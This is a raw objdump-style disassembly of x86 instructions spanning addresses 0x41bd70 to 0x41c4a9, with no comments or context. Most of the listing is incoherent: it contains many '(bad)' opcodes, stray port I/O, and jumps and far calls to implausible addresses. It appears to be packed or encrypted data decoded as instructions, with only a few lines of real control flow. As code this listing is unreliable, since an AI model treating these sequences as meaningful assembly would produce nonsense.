  41bd70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd71:	fnstsw WORD PTR cs:[esi+edx*1-0x2b50dbf0]
  41bd79:	jo     0x41bd3f
  41bd7b:	fucom  st(4)
  41bd7d:	stos   DWORD PTR es:[edi],eax
  41bd7e:	cld    
  41bd7f:	mov    bl,0x25
  41bd81:	mov    BYTE PTR [ebx],ch
  41bd83:	cmp    al,0xa8
  41bd85:	jnp    0x41bda0
  41bd87:	inc    ecx
  41bd88:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd8b:	jmp    0x41bfc0
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xffffffcb
  41bd9d:	retf   0xbf78
  41bda0:	mov    al,ds:0x10787fea
  41bda5:	jle    0x41be1f
  41bda7:	js     0x41bdb0
  41bda9:	punpcklbw mm4,DWORD PTR [eax]
  41bdac:	ds dec edi
  41bdae:	scas   eax,DWORD PTR es:[edi]
  41bdaf:	xor    ecx,DWORD PTR [ecx+0x1d]
  41bdb2:	mov    bl,0xea
  41bdb4:	das    
  41bdb5:	sbb    eax,0x19824d98
  41bdba:	shr    esp,1
  41bdbc:	adc    bh,dl
  41bdbe:	push   edi
  41bdbf:	sbb    edx,DWORD PTR [ebx+ecx*2-0x39c902d2]
  41bdc6:	pop    ebp
  41bdc7:	out    dx,eax
  41bdc8:	ds jmp 0x68be7b8f
  41bdce:	lahf   
  41bdcf:	in     al,0x2f
  41bdd1:	retf   
  41bdd2:	xlat   BYTE PTR ds:[ebx]
  41bdd3:	rcr    BYTE PTR [ecx-0xa],cl
  41bdd6:	push   ecx
  41bdd7:	dec    esi
  41bdd8:	adc    dh,BYTE PTR [ebx+ebp*4-0xa]
  41bddc:	jg     0x41bd91
  41bdde:	js     0x41bdb2
  41bde0:	dec    esp
  41bde1:	dec    ebx
  41bde2:	aam    0x8f
  41bde4:	jb     0x41bde0
  41bde6:	test   al,0xce
  41bde8:	leave  
  41bde9:	fnstenv [edi+0x2fbd93d2]
  41bdef:	sub    al,0xae
  41bdf1:	(bad)  
  41bdf2:	jne    0x41be2d
  41bdf4:	loopne 0x41be2c
  41bdf6:	mov    esi,ecx
  41bdf8:	popf   
  41bdf9:	into   
  41bdfa:	dec    edi
  41bdfb:	scas   eax,DWORD PTR es:[edi]
  41bdfc:	dec    esi
  41bdfd:	(bad)  
  41bdfe:	xlat   BYTE PTR ds:[ebx]
  41bdff:	enter  0xb1a0,0xa9
  41be03:	xor    al,0x37
  41be05:	xor    BYTE PTR [eax-0x25c8dd02],dl
  41be0b:	rol    DWORD PTR [eax-0x26],0xfe
  41be0f:	(bad)  
  41be10:	stc    
  41be11:	repnz fwait
  41be13:	sbb    al,0xae
  41be15:	xlat   BYTE PTR ds:[ebx]
  41be16:	push   ds
  41be17:	ins    DWORD PTR es:[edi],dx
  41be18:	mov    ds:0x157eee8a,eax
  41be1d:	out    dx,eax
  41be1e:	xchg   esp,eax
  41be1f:	iret   
  41be20:	xor    DWORD PTR [ebx],esp
  41be22:	add    bh,BYTE PTR [ecx-0x20]
  41be25:	les    edx,FWORD PTR [eax+edx*1]
  41be28:	je     0x41be14
  41be2a:	and    BYTE PTR [ebp-0x1a],al
  41be2d:	sub    al,0x3d
  41be2f:	fist   DWORD PTR ds:0xc9e9b6f4
  41be35:	jl     0x41be7d
  41be37:	pop    esp
  41be38:	aas    
  41be39:	test   DWORD PTR [ebx+ecx*2],0x6ed4d099
  41be40:	inc    ebp
  41be41:	mov    al,0xfd
  41be43:	mov    dl,0x7
  41be45:	add    BYTE PTR [ebx],dl
  41be47:	mov    DWORD PTR [ebx-0x2a1a3a11],esi
  41be4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be4e:	or     eax,0x395e2b2f
  41be53:	sbb    BYTE PTR [edi],ch
  41be55:	sbb    ebp,DWORD PTR [esp+esi*8-0x1f]
  41be59:	sahf   
  41be5a:	jg     0x41be9a
  41be5c:	test   eax,0x7603dd6e
  41be61:	aas    
  41be62:	push   edi
  41be63:	or     ecx,DWORD PTR [ecx+0x6bb45585]
  41be69:	push   0x2a811900
  41be6e:	lock shl BYTE PTR [esi+0x40841355],1
  41be75:	push   esi
  41be76:	xchg   edx,eax
  41be77:	ss clc 
  41be79:	lea    edi,[eax+0x26]
  41be7c:	mov    dh,0x91
  41be7e:	push   esp
  41be7f:	or     DWORD PTR [edi-0x74],edi
  41be82:	jmp    0x41be37
  41be84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be85:	icebp  
  41be86:	jnp    0x41be48
  41be88:	and    DWORD PTR [ebp-0x11],0x28073f19
  41be8f:	jg     0x41be72
  41be91:	jae    0x41bef5
  41be93:	ins    DWORD PTR es:[edi],dx
  41be94:	jne    0x41bec5
  41be96:	cld    
  41be97:	pop    ebp
  41be98:	or     eax,0x7de498d
  41be9d:	dec    ecx
  41be9e:	pop    edx
  41be9f:	dec    ebx
  41bea0:	scas   al,BYTE PTR es:[edi]
  41bea1:	inc    eax
  41bea2:	xchg   ebp,eax
  41bea3:	dec    edi
  41bea4:	scas   al,BYTE PTR es:[edi]
  41bea5:	inc    eax
  41bea6:	stc    
  41bea7:	sub    al,0xd0
  41bea9:	adc    BYTE PTR [edi+0x3b],0x3a
  41bead:	ret    
  41beae:	in     eax,dx
  41beaf:	nop
  41beb0:	or     eax,0x23b74e1
  41beb5:	mov    dh,0x4b
  41beb7:	inc    eax
  41beb8:	or     al,0x9a
  41beba:	push   cs
  41bebb:	pop    es
  41bebc:	dec    ebx
  41bebd:	xor    al,0xef
  41bebf:	xor    al,BYTE PTR [ecx-0x5611aea1]
  41bec5:	test   DWORD PTR ds:[ebx-0x697e6515],esp
  41becc:	mov    dh,0x34
  41bece:	pop    eax
  41becf:	gs pop ss
  41bed1:	scas   eax,DWORD PTR es:[edi]
  41bed2:	fdivr  DWORD PTR [edx+0xe3ab391]
  41bed8:	pushf  
  41bed9:	je     0x41bf4d
  41bedb:	jbe    0x41beeb
  41bedd:	xchg   ebx,eax
  41bede:	pushf  
  41bedf:	xchg   ecx,eax
  41bee0:	or     DWORD PTR [eax+0x14],edi
  41bee3:	dec    eax
  41bee4:	cli    
  41bee5:	std    
  41bee6:	sbb    BYTE PTR [edi],bl
  41bee8:	pop    esp
  41bee9:	loop   0x41becb
  41beeb:	jno    0x41bf53
  41beed:	(bad)  
  41beee:	mov    dh,0x49
  41bef0:	mov    eax,0xa7d7ee59
  41bef5:	(bad)  
  41bef7:	test   eax,0x7044e614
  41befc:	mov    al,0xb
  41befe:	mov    dx,0xd856
  41bf02:	neg    DWORD PTR [edx+0x1c]
  41bf05:	ins    BYTE PTR es:[edi],dx
  41bf06:	sti    
  41bf07:	jns    0x41be90
  41bf09:	or     eax,0x4b9fbefc
  41bf0e:	mov    ebp,0xe4864cc2
  41bf13:	int    0x85
  41bf15:	and    BYTE PTR [ebp+edx*1-0x2ee9a6f0],bh
  41bf1c:	test   DWORD PTR [edx+0x6ea5cd69],0x94a6f12b
  41bf26:	sbb    edi,eax
  41bf28:	mov    gs,WORD PTR [eax]
  41bf2a:	pop    esi
  41bf2b:	jno    0x41bf17
  41bf2d:	loopne 0x41bf5a
  41bf2f:	outs   dx,BYTE PTR ds:[esi]
  41bf30:	retf   0xb4b0
  41bf33:	or     esp,esi
  41bf35:	adc    eax,0x10bd0f0b
  41bf3a:	or     esp,DWORD PTR fs:[ebp+ecx*2+0x1379c848]
  41bf42:	pushf  
  41bf43:	mov    edx,0x18aef6f8
  41bf48:	lds    esi,FWORD PTR [edx+0x4ade6401]
  41bf4e:	dec    edi
  41bf4f:	cwde   
  41bf50:	sbb    DWORD PTR [esi],0xe261ea9
  41bf56:	sub    eax,0x4d110551
  41bf5b:	adc    al,0xe1
  41bf5d:	aad    0x64
  41bf5f:	jno    0x41bfc8
  41bf61:	and    al,0x7c
  41bf63:	pop    ebx
  41bf64:	(bad)  
  41bf65:	enter  0x7fef,0x47
  41bf69:	retf   
  41bf6a:	fisub  DWORD PTR [edi+0x758cc644]
  41bf70:	inc    ebp
  41bf71:	xchg   ecx,eax
  41bf72:	adc    al,0x49
  41bf74:	mov    edi,0x6b13c238
  41bf79:	push   ss
  41bf7a:	xchg   edi,eax
  41bf7b:	inc    ecx
  41bf7c:	(bad)  
  41bf7e:	daa    
  41bf7f:	adc    DWORD PTR [ebx+eiz*8],esp
  41bf82:	ret    
  41bf83:	out    0x68,al
  41bf85:	cmp    BYTE PTR [esi],ah
  41bf87:	xchg   BYTE PTR [esi],ah
  41bf89:	cmp    edx,DWORD PTR [edx+0x792ab60b]
  41bf8f:	cmc    
  41bf90:	mov    cs,WORD PTR [edi-0x5f]
  41bf93:	sbb    eax,0x1184d6f5
  41bf98:	(bad)  
  41bf99:	mov    ?,WORD PTR [esp+esi*2-0x6]
  41bf9d:	add    DWORD PTR [ebx+0x3f],esi
  41bfa0:	inc    eax
  41bfa1:	iret   
  41bfa2:	xchg   edx,eax
  41bfa3:	(bad)  
  41bfa4:	jnp    0x41bfc0
  41bfa6:	loope  0x41bffe
  41bfa8:	loopne 0x41bf40
  41bfaa:	imul   esp,DWORD PTR [esi+0x65dca8c1],0x75
  41bfb1:	out    dx,al
  41bfb2:	in     eax,dx
  41bfb3:	inc    ebp
  41bfb4:	push   cs
  41bfb5:	dec    edx
  41bfb6:	fisub  WORD PTR [eax+0x6e]
  41bfb9:	outs   dx,BYTE PTR ds:[esi]
  41bfba:	lea    esp,[esi-0x29]
  41bfbd:	inc    ecx
  41bfbe:	push   ecx
  41bfbf:	aaa    
  41bfc0:	lea    ecx,[edx+ecx*1+0x327298]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	push   es
  41bff0:	test   eax,0xe8b821d2
  41bff5:	jg     0x41c06f
  41bff7:	adc    BYTE PTR [esi+0x78],bh
  41bffa:	js     0x41c07a
  41bffc:	mov    ch,0xff
  41bffe:	inc    esp
  41bfff:	sahf   
  41c000:	retf   0x9df
  41c003:	in     eax,dx
  41c004:	dec    ecx
  41c005:	cwde   
  41c006:	call   0xe47e00de
  41c00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c00c:	loope  0x41bffe
  41c00e:	mov    ?,WORD PTR [ebp-0x4b]
  41c011:	push   esp
  41c012:	mov    ecx,0x2c588537
  41c017:	push   cs
  41c018:	call   0xef45ed2b
  41c01d:	mov    ds:0xf68c6652,eax
  41c022:	fist   WORD PTR [ebx-0x2e3ce001]
  41c028:	push   esp
  41c029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c02b:	inc    edi
  41c02c:	xchg   BYTE PTR [edx+eax*2],bh
  41c02f:	push   ecx
  41c030:	mov    cl,0xc2
  41c032:	(bad)  
  41c033:	xchg   ebp,eax
  41c034:	mov    dl,0x43
  41c036:	add    al,0x5c
  41c038:	dec    esi
  41c039:	jecxz  0x41c0a1
  41c03b:	ds repz pop edi
  41c03e:	push   edi
  41c03f:	push   eax
  41c040:	test   al,0x5b
  41c042:	jns    0x41c09f
  41c044:	std    
  41c045:	sub    DWORD PTR [ebp+eiz*1+0x74],ebx
  41c049:	test   BYTE PTR [ebp-0x67],bl
  41c04c:	adc    ebp,ebx
  41c04e:	inc    ebp
  41c04f:	xchg   edx,eax
  41c050:	hlt    
  41c051:	cmp    bh,BYTE PTR [esi-0x7b46168a]
  41c057:	shl    BYTE PTR [eax+0x70d0f982],1
  41c05d:	pop    esp
  41c05e:	sar    DWORD PTR [edi],1
  41c060:	xor    esi,ebx
  41c062:	push   ds
  41c063:	(bad)  
  41c064:	in     eax,dx
  41c065:	out    0x32,eax
  41c067:	in     al,0x1a
  41c069:	loop   0x41c0b8
  41c06b:	in     al,dx
  41c06c:	adc    al,0x80
  41c06e:	mov    esp,0xbe47749c
  41c073:	mov    ds,WORD PTR [edi+0x61e0cb3]
  41c079:	cmp    cl,BYTE PTR [ecx+0x1142a51a]
  41c07f:	sbb    dh,0xb3
  41c082:	stos   BYTE PTR es:[edi],al
  41c083:	stos   DWORD PTR es:[edi],eax
  41c084:	and    DWORD PTR [edx-0x33],eax
  41c087:	jp     0x41c05c
  41c089:	std    
  41c08a:	jne    0x41c014
  41c08c:	bswap  edx
  41c08e:	sub    al,BYTE PTR fs:[ecx+0x3c]
  41c092:	in     eax,0xcd
  41c094:	fmul   DWORD PTR [esi+ebx*1]
  41c097:	enter  0x5995,0x0
  41c09b:	push   ebp
  41c09c:	push   0xa2d9cfd6
  41c0a1:	stos   DWORD PTR es:[edi],eax
  41c0a2:	mov    ch,0xcf
  41c0a4:	jns    0x41c0a5
  41c0a6:	(bad)  
  41c0a7:	and    al,0xb5
  41c0a9:	mov    ds:0xe1f5c164,eax
  41c0ae:	cmp    eax,0x8d263daf
  41c0b3:	dec    eax
  41c0b4:	jno    0x41c0c3
  41c0b6:	xchg   BYTE PTR [edi-0x7dbf42bd],cl
  41c0bc:	fld1   
  41c0be:	jns    0x41c114
  41c0c0:	or     eax,0x86d05a80
  41c0c5:	imul   edx,esp,0x43ea4eb9
  41c0cb:	rcr    DWORD PTR [esi-0x5c],0x26
  41c0cf:	mov    al,ds:0x332f6fda
  41c0d4:	push   es
  41c0d5:	test   BYTE PTR [esi-0x71feff2b],dh
  41c0db:	mov    edi,DWORD PTR ds:0xf4b359b6
  41c0e1:	add    al,0xe9
  41c0e3:	inc    BYTE PTR [ebx+ecx*4-0x26]
  41c0e7:	div    DWORD PTR ds:0xade059a5
  41c0ed:	fcom   DWORD PTR [eax-0x7b]
  41c0f0:	(bad)  
  41c0f1:	sub    eax,0xf587cb3
  41c0f6:	dec    eax
  41c0f7:	jo     0x41c131
  41c0f9:	int3   
  41c0fa:	cs stos DWORD PTR es:[edi],eax
  41c0fc:	pop    esi
  41c0fd:	addr16 dec edx
  41c0ff:	out    dx,al
  41c100:	sbb    ch,bh
  41c102:	jge    0x41c091
  41c104:	rcl    DWORD PTR [edi+edi*8],cl
  41c107:	push   es
  41c108:	sbb    dl,BYTE PTR [esi+edi*8-0x51]
  41c10c:	call   0xc85901c2
  41c111:	je     0x41c0e2
  41c113:	jnp    0x41c18b
  41c115:	iret   
  41c116:	lods   eax,DWORD PTR ds:[esi]
  41c117:	add    eax,0x5f4ae58b
  41c11c:	dec    esp
  41c11d:	pop    ecx
  41c11e:	mov    BYTE PTR [ebp+ebx*8-0x5e],bl
  41c122:	or     bh,BYTE PTR [ecx+0x5e]
  41c125:	dec    esi
  41c126:	push   es
  41c127:	push   edx
  41c128:	sub    al,0x5d
  41c12a:	adc    ch,BYTE PTR [edi+0x43]
  41c12d:	dec    esp
  41c12e:	add    BYTE PTR [ebx+ebx*4+0x47],ah
  41c132:	cmc    
  41c133:	xchg   edx,eax
  41c134:	outs   dx,BYTE PTR ds:[esi]
  41c135:	jmp    0x93f5:0x770295a6
  41c13c:	xlat   BYTE PTR ds:[ebx]
  41c13d:	push   edi
  41c13e:	ins    DWORD PTR es:[edi],dx
  41c13f:	(bad)  
  41c140:	mov    esp,0x82cf678d
  41c145:	mov    fs,edx
  41c147:	test   BYTE PTR [ebx-0x45],dh
  41c14a:	int3   
  41c14b:	sbb    esp,DWORD PTR [edx+0x5441ed0a]
  41c151:	das    
  41c152:	push   edi
  41c153:	loop   0x41c1b6
  41c155:	or     DWORD PTR [edi+0x2c],ebx
  41c158:	mov    eax,0x5364c1d1
  41c15d:	dec    ebp
  41c15e:	mov    bh,0x85
  41c160:	ins    DWORD PTR es:[edi],dx
  41c161:	pop    edi
  41c162:	pop    edx
  41c163:	jae    0x41c165
  41c165:	mov    al,0x89
  41c167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c168:	scas   al,BYTE PTR es:[edi]
  41c169:	adc    eax,0x9bb74729
  41c16e:	and    ecx,DWORD PTR [edi]
  41c170:	call   0xde8aa527
  41c175:	daa    
  41c176:	fimul  WORD PTR [edx-0x3b]
  41c179:	cld    
  41c17a:	mov    edx,0xacac445d
  41c17f:	stos   DWORD PTR es:[edi],eax
  41c180:	mov    eax,ds:0xf56b935c
  41c185:	in     al,dx
  41c186:	out    dx,eax
  41c187:	dec    edx
  41c188:	sub    BYTE PTR [eax+0x59],dh
  41c18b:	data16 mov ah,0x5a
  41c18e:	imul   edi,DWORD PTR [eax],0x9
  41c191:	dec    esp
  41c192:	shr    BYTE PTR [ebx+0x12],cl
  41c195:	std    
  41c196:	jecxz  0x41c11d
  41c198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c19a:	fprem1 
  41c19c:	into   
  41c19d:	fimul  WORD PTR [ebx-0x28a60609]
  41c1a3:	and    DWORD PTR [eax-0x4d],edi
  41c1a6:	push   edx
  41c1a7:	and    DWORD PTR [ecx-0x67],0x17d056f8
  41c1ae:	fst    st(6)
  41c1b0:	adc    al,0xc6
  41c1b2:	mov    esp,0x38b3f1e8
  41c1b7:	add    DWORD PTR [edx],0x952a9103
  41c1bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1be:	iret   
  41c1bf:	dec    eax
  41c1c0:	mov    ds:0x5feb2135,eax
  41c1c5:	out    dx,al
  41c1c6:	mov    eax,0xb0ac6e59
  41c1cb:	or     DWORD PTR [eax+0x74fc0da5],ebx
  41c1d1:	mov    eax,ds:0xd9152ac0
  41c1d6:	ins    DWORD PTR es:[edi],dx
  41c1d7:	daa    
  41c1d8:	add    BYTE PTR [edx],0x94
  41c1db:	push   edi
  41c1dc:	fwait
  41c1dd:	sbb    eax,0xac2b35c5
  41c1e2:	mov    esi,0xce3949dc
  41c1e7:	push   cs
  41c1e8:	mov    gs,WORD PTR [edx]
  41c1ea:	(bad)  
  41c1ec:	adc    DWORD PTR [ecx-0x60fbc476],esp
  41c1f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1f3:	dec    ecx
  41c1f4:	xor    BYTE PTR [eax],bh
  41c1f6:	adc    eax,0x72739065
  41c1fb:	sub    DWORD PTR [eax-0x1297aee9],eax
  41c201:	and    edx,DWORD PTR [ebp+0x4d]
  41c204:	mov    esi,0x6aa186c7
  41c209:	leave  
  41c20a:	and    esp,esi
  41c20c:	jp     0x41c24c
  41c20e:	fbld   TBYTE PTR [ebx+0x7]
  41c211:	into   
  41c212:	jle    0x41c249
  41c214:	push   eax
  41c215:	or     BYTE PTR [ecx+0x7],dl
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	cmc    
  41c22c:	adc    bh,BYTE PTR [edi+edi*1]
  41c22f:	push   eax
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c2b7
  41c238:	inc    esi
  41c239:	dec    ecx
  41c23a:	test   eax,0x75e4d95a
  41c23f:	repnz arpl WORD PTR [edx-0x63d3c311],bp
  41c246:	pop    esp
  41c247:	ja     0x41c24b
  41c249:	fcomip st,st(6)
  41c24b:	sbb    al,0xb9
  41c24d:	mov    cl,0xbc
  41c24f:	push   esi
  41c250:	mov    ?,WORD PTR [esi]
  41c252:	and    al,0x14
  41c255:	mov    ebp,ebx
  41c257:	jns    0x41c284
  41c259:	and    ecx,DWORD PTR [esi]
  41c25b:	lods   eax,DWORD PTR ds:[esi]
  41c25c:	mov    ds:0x2dea1657,al
  41c261:	clc    
  41c262:	add    BYTE PTR [ebx+0x22],dl
  41c265:	mov    esp,0x58a30989
  41c26a:	adc    esi,DWORD PTR [ebp+0x1e]
  41c26d:	cli    
  41c26e:	leave  
  41c26f:	lahf   
  41c270:	sbb    esi,ecx
  41c272:	stos   BYTE PTR es:[edi],al
  41c273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c274:	fld    QWORD PTR [eax+0x34]
  41c277:	mov    al,0x65
  41c279:	repz clc 
  41c27b:	vmulpd ymm2,ymm3,YMMWORD PTR [eax+0x564ed547]
  41c283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c284:	in     al,0xad
  41c286:	jb     0x41c269
  41c288:	lods   al,BYTE PTR ds:[esi]
  41c289:	sahf   
  41c28a:	cmp    ecx,DWORD PTR [ebx]
  41c28c:	sub    DWORD PTR ds:0x8f9b6a47,edi
  41c292:	mov    BYTE PTR [edx-0x21],bl
  41c295:	mov    ecx,0x55facd29
  41c29a:	xor    BYTE PTR [ebp+0x34],cl
  41c29d:	push   ss
  41c29e:	mov    ebp,0xb2c4018d
  41c2a3:	adc    dl,ch
  41c2a5:	cwde   
  41c2a6:	lods   eax,DWORD PTR ds:[esi]
  41c2a7:	(bad)  
  41c2a8:	mov    ss,WORD PTR [ebx+0x261dbc18]
  41c2ae:	sbb    al,0xf2
  41c2b0:	idiv   BYTE PTR [edi-0x11]
  41c2b3:	sub    esp,DWORD PTR [eax+0x41]
  41c2b6:	xchg   DWORD PTR [edx+0x65],edi
  41c2b9:	popf   
  41c2ba:	or     dl,dl
  41c2bc:	mov    ebp,0x54187323
  41c2c1:	adc    dh,BYTE PTR [eax+0x42]
  41c2c4:	mov    bl,0x48
  41c2c6:	imul   esi,ecx,0x2387d262
  41c2cc:	mov    ch,0x11
  41c2ce:	sbb    ebp,DWORD PTR [ebx]
  41c2d0:	arpl   WORD PTR [eax+0x7b],sp
  41c2d3:	lock dec ebp
  41c2d5:	xlat   BYTE PTR ds:[ebx]
  41c2d6:	imul   ebp,DWORD PTR [ebx-0x36],0xffffffa6
  41c2da:	pop    ebp
  41c2db:	sub    dl,BYTE PTR [edx]
  41c2dd:	pop    eax
  41c2de:	daa    
  41c2df:	xchg   edi,eax
  41c2e0:	rcl    DWORD PTR [di+0x5877],0x10
  41c2e6:	call   0xb864:0x309d2fb1
  41c2ed:	pop    ebx
  41c2ee:	xchg   ecx,eax
  41c2ef:	mov    DWORD PTR [ebp-0x3e],edi
  41c2f2:	adc    eax,0x4bee34a6
  41c2f7:	sub    dl,BYTE PTR ds:0x248f763f
  41c2fd:	pop    eax
  41c2fe:	sub    ecx,edx
  41c300:	sub    ecx,DWORD PTR [ebx-0x57]
  41c303:	pop    eax
  41c304:	xchg   BYTE PTR [ecx+0x2c],dh
  41c307:	mov    al,0xca
  41c309:	jle    0x41c2c9
  41c30b:	sbb    dl,BYTE PTR [ebp+0x5a]
  41c30e:	cmp    edi,DWORD PTR [ebx]
  41c310:	nop
  41c311:	clc    
  41c312:	(bad)  
  41c313:	lock fcomip st,st(1)
  41c316:	pop    ebx
  41c317:	pop    ebx
  41c318:	mov    esi,0xb50ceef
  41c31d:	inc    edx
  41c31e:	out    0xf0,eax
  41c320:	clc    
  41c321:	jle    0x41c2b5
  41c323:	mov    eax,ds:0xc170a567
  41c328:	movq   mm3,QWORD PTR [edx+0x7a9849b7]
  41c32f:	inc    esi
  41c330:	prefetcht1 BYTE PTR [ecx]
  41c333:	xchg   ebp,eax
  41c334:	js     0x41c302
  41c336:	sub    eax,0x64f5fe15
  41c33b:	call   0x37eb:0x1ebcb6b5
  41c342:	dec    ebp
  41c343:	mov    eax,0xab23fd4a
  41c348:	dec    eax
  41c349:	cmp    BYTE PTR [esp+edx*1],0x2b
  41c34d:	nop
  41c34e:	xchg   BYTE PTR [eax-0x60b4a2ae],dl
  41c354:	jg     0x41c3c9
  41c356:	cmp    al,0x16
  41c358:	xchg   DWORD PTR [ebp+0x65],ebx
  41c35b:	repz dec ebp
  41c35d:	pop    edi
  41c35e:	mov    ebx,0x773b7fe6
  41c363:	imul   ecx,DWORD PTR [esi+edi*2+0x28c403f0],0xffffffb9
  41c36b:	sti    
  41c36c:	mov    esp,0xddd503b7
  41c371:	les    ebp,FWORD PTR [ebp+0x62]
  41c374:	clc    
  41c375:	pop    ds
  41c376:	fistp  WORD PTR [ebp-0x5b]
  41c379:	or     ah,BYTE PTR [bx+si]
  41c37c:	fbld   TBYTE PTR [ecx]
  41c37e:	hlt    
  41c37f:	adc    DWORD PTR [ebx-0x77],eax
  41c382:	pop    edi
  41c383:	jns    0x41c3c5
  41c385:	loope  0x41c3a7
  41c387:	loop   0x41c3e0
  41c389:	cmp    eax,0x7902a2cb
  41c38e:	sub    DWORD PTR [eax],esi
  41c390:	fs iret 
  41c392:	dec    esi
  41c393:	nop
  41c394:	ins    DWORD PTR es:[edi],dx
  41c395:	fwait
  41c396:	sbb    al,BYTE PTR [ecx-0x2105bc18]
  41c39c:	fbstp  TBYTE PTR [ecx+eiz*1-0x79]
  41c3a0:	pop    edi
  41c3a1:	or     ecx,DWORD PTR [edx-0x7b]
  41c3a4:	mov    bh,0xd6
  41c3a6:	rcr    BYTE PTR [eax+0x48417738],cl
  41c3ac:	int3   
  41c3ad:	pushf  
  41c3ae:	or     DWORD PTR [ebx-0x35],edx
  41c3b1:	pop    eax
  41c3b2:	fimul  WORD PTR [eax+ebp*4]
  41c3b5:	pop    es
  41c3b6:	or     BYTE PTR [eax+0x20],0x4a
  41c3ba:	pushf  
  41c3bb:	cli    
  41c3bc:	scas   eax,DWORD PTR es:[edi]
  41c3bd:	sbb    ch,cl
  41c3bf:	add    cl,BYTE PTR [ebx-0x68eb402e]
  41c3c5:	pop    esp
  41c3c6:	xchg   ecx,eax
  41c3c7:	pusha  
  41c3c8:	scas   eax,DWORD PTR es:[edi]
  41c3c9:	sub    DWORD PTR [eax+0x9],esi
  41c3cc:	push   ds
  41c3cd:	(bad)  
  41c3ce:	jp     0x41c44f
  41c3d0:	and    dl,BYTE PTR [ebx+0x57]
  41c3d3:	cmp    eax,DWORD PTR [edi+eax*1-0x52]
  41c3d7:	pop    esi
  41c3d8:	stos   BYTE PTR es:[edi],al
  41c3d9:	push   ebx
  41c3db:	pop    ss
  41c3dc:	xor    DWORD PTR [ecx-0x6c87b3d9],esi
  41c3e2:	sbb    DWORD PTR [ecx-0x41],eax
  41c3e5:	ins    BYTE PTR es:[edi],dx
  41c3e6:	jmp    0x41c3d6
  41c3e8:	call   0x1ba5:0xd333ff86
  41c3ef:	jecxz  0x41c437
  41c3f1:	push   0xffffffb0
  41c3f3:	and    ecx,DWORD PTR [ecx+0x6ec90b41]
  41c3f9:	mov    al,ds:0xdf51d7ff
  41c3fe:	adc    dh,0x25
  41c401:	lds    ecx,FWORD PTR [ebx-0x63]
  41c404:	nop
  41c405:	pop    esp
  41c406:	jb     0x41c481
  41c408:	xor    BYTE PTR [ecx+ebp*1+0x42],bl
  41c40c:	stc    
  41c40d:	push   ss
  41c40e:	adc    al,0xff
  41c410:	sub    DWORD PTR [eax+0x8fc65d9],ebp
  41c416:	pop    ds
  41c417:	out    dx,eax
  41c418:	add    eax,0xba3c4f5d
  41c41d:	test   ebp,ecx
  41c41f:	or     eax,0xc49a5101
  41c424:	pop    esp
  41c425:	(bad)  
  41c426:	dec    edi
  41c427:	dec    eax
  41c428:	icebp  
  41c429:	mov    eax,ds:0xc06cf961
  41c42e:	mov    edx,DWORD PTR [ebx]
  41c430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c431:	push   esp
  41c432:	pop    edx
  41c433:	cmp    BYTE PTR [edi-0xa],dh
  41c436:	adc    DWORD PTR [ebp+0x38],0x13
  41c43a:	inc    edx
  41c43b:	int3   
  41c43c:	push   es
  41c43d:	or     eax,0xb1303543
  41c442:	inc    ecx
  41c443:	jbe    0x41c420
  41c445:	stos   BYTE PTR es:[edi],al
  41c446:	xor    BYTE PTR [esi+0x2437570c],cl
  41c44c:	cmp    al,0xda
  41c44e:	push   0xe9f44589
  41c453:	xor    BYTE PTR [edx],al
  41c455:	add    BYTE PTR [eax],al
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c4dd
  41c464:	sub    DWORD PTR [esp+edi*4+0x68],esp
  41c468:	in     al,dx
  41c469:	jg     0x41c4e3
  41c46b:	adc    BYTE PTR [esi+0x78],bh
  41c46e:	js     0x41c4d1
  41c470:	mov    ebp,0x9faf83f8
  41c475:	inc    edx
  41c476:	sbb    DWORD PTR [esi+0xe36ddad],ecx
  41c47c:	retf   0x4e3
  41c47f:	(bad)
  41c482:	(bad)  
  41c483:	xor    al,0x9
  41c485:	js     0x41c47d
  41c487:	dec    esi
  41c488:	inc    esp
  41c489:	or     DWORD PTR [edx+edx*4-0x4b],esi
  41c48d:	cmp    eax,0x183c6545
  41c492:	imul   esi,DWORD PTR [edi+0x66],0xc704951e
  41c499:	test   BYTE PTR [ebx+0x52],al
  41c49c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c49d:	(bad)  
  41c49e:	jae    0x41c468
  41c4a0:	push   ebx
  41c4a1:	sahf   
  41c4a2:	mov    cl,0x72
  41c4a4:	push   ebx
  41c4a5:	ret    0x164b
  41c4a8:	xchg   ecx,eax
  41c4a9:	xlat   BYTE PTR ds:[ebx]
